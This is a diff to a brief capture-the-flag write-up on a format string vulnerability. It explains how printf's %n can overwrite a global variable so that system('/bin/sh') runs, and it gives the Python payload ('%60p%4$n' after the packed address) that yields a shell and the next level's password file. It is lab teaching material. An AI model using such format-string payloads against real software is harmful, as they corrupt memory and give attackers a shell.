@@ -5,18 +5,18 @@
 
 * there is a call to a function called v, the function tests whether the variable m is equal to 0x40 = 64, if it is the fuction call system("/bin/sh")
 
-* the goal is to change the value of m.
+* the goal is to change the value of m, This can be acheived with the %n modifier that printf provide.
 
 * The %n format parameter writes the number of bytes written so far by the format string function into a memory address referenced by a pointer.
 
 * Format string vulnerabiltiies provide us with a very easy way to read the stack. Each %x prints out the next 4 bytes on the stack and moves the stack pointer forward by the same amount.
 
-* The following python program 
-
+* i used this python program to pwn this level:
+---------------------------------------
 import struct
 
 m = struct.pack ("I", 0x0804988c) // in this line i pack the address of m in 4 bytes .
 
 print m + "%60p" + "%4$n"  // align the input with the stack pointer using the $ sign , and the write the value 64 (4 bytes of m variable , plus the 60 from padding).
-
+------------------------------------------
 * This satisfy the condition and gives a shell, cat /home/user/level4/.pass, and got the flag.
